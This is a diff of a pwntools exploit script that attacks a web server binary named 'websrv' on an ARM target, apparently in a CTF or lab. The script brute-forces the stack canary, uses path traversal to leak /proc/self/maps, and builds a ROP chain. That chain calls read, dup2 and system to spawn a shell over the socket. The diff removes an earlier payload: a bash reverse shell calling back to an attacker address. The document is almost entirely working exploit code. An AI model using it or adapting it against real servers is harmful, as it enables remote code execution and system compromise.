@@ -3,8 +3,8 @@
 from pwn import *
 
 REMOTE = "192.168.100.2"
-LOCAL = "192.168.100.254"
-LOCAL_PORT = 5555
+
+maps = None
 
 def bruteforce_canary():
     pre_pad = cyclic(0x1000 - 40)
@@ -59,27 +59,40 @@ def leak_libc_base(pre_pad, io):
 def leak(io, path="../../../proc/self/maps"):
     request("AAAA", io, path)
     data = io.recvrepeat(0.2)
-    data = data.split("\n")
-    for item in data:
-        if "libc" in item:
-            libc_base = item.split("-")[0]
-            break
 
-    for item in data:
-        if "websrv" in item:
-            bin_base = item.split("-")[0]
-            break
+    maps = {}
+    for start, end, prot, name in re.findall('([a-f0-9]+)-([a-f0-9]+) (...)p [^\n]* ([^\s\n]+)\n', data):
+        name = name.split('/')[-1]
+        if name == '0':
+            continue
+        elif '[' == name[0]:
+            name = name[1:-1]
+        elif 'rw-' == prot:
+            name += '.bss'
+        elif 'r--' == prot:
+            name += '.rodata'
+        if not name in maps:
+            maps[name] = int(start, 16)
 
-    for item in data:
-        if "stack" in item:
-            stack_base = item.split("-")[0]
-            break
+    return maps
 
-    libc_base = int(libc_base, 16)
-    bin_base = int(bin_base, 16)
-    stack_base = int(stack_base, 16)
-    
-    return bin_base, libc_base, stack_base
+
+def call(func, *args):
+    poppc   = maps['libc-2.13.so'] + 0x000029cc + 1 #: pop {r0, r1, r2, r3, r5, pc}
+    blxpop  = maps["libc-2.13.so"] + 0x00090b80 + 1 #: blx r5 ; pop {r4, r5, r6, pc}
+    #ppc     = maps['websrv_nop'] + 0x000011f0 #: pop {r4, pc}
+
+    regargs = list(args[:4]) + [0] * 4
+    stackargs = list(args[4:]) + [0] * 3
+
+    pad = p32(poppc)
+    pad += "".join(p32(x) for x in regargs[:4])
+    pad += p32(func)
+    pad += p32(blxpop)
+    pad += "".join(p32(x) for x in stackargs[:3])
+
+    return pad
+
 
 if __name__ == "__main__":
     binary = ELF("./websrv")
@@ -93,25 +106,36 @@ if __name__ == "__main__":
     context.log_level = "info"
 
     io = remote(REMOTE, 80)
-    bin_base, libc_base, stack_base = leak(io)
+    maps = leak(io)
+    bin_base = maps["websrv_nop"]
+    libc_base = maps["libc-2.13.so"]
+    stack_base = maps["stack"]
+
     print "[+] leak: bin_base 0x%x libc_base 0x%x, stack_base 0x%x " \
             %( bin_base, libc_base, stack_base)
     
     binary.address = bin_base
     libc.address = libc_base
 
-    command = "; bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\x00" % (LOCAL, LOCAL_PORT)
-    payload = command.rjust(0x1000, "A")
+
+    payload = "$" * (0x1000 - 40)
     payload += cookie
     payload += cyclic(cyclic_find(p32(0x6161616a)))
-
-
-    rop = ROP(binary)
-    rop.call(libc.symbols["system"], (stack_base + 0x20000 + 0x580,))
-    print rop.dump()
-    print rop.chain().encode("hex") 
     
-    payload += rop.chain()
-    io.send(payload)
+
+    cmd = "/bin/sh\x00"
+
+    rop = call(libc.symbols["read"], 4, maps["websrv_nop.bss"], len(cmd) + 1)
+    rop += call(libc.symbols["dup2"], 4, 0)
+    rop += call(libc.symbols["dup2"], 4, 1)
+    rop += call(libc.symbols["dup2"], 4, 2)
+    rop += call(libc.symbols["system"], maps["websrv_nop.bss"])
+
     
+    payload += rop
+    request(payload, io)
+
+    io.sendline(cmd)
+
+    io.interactive() 
     io.close()
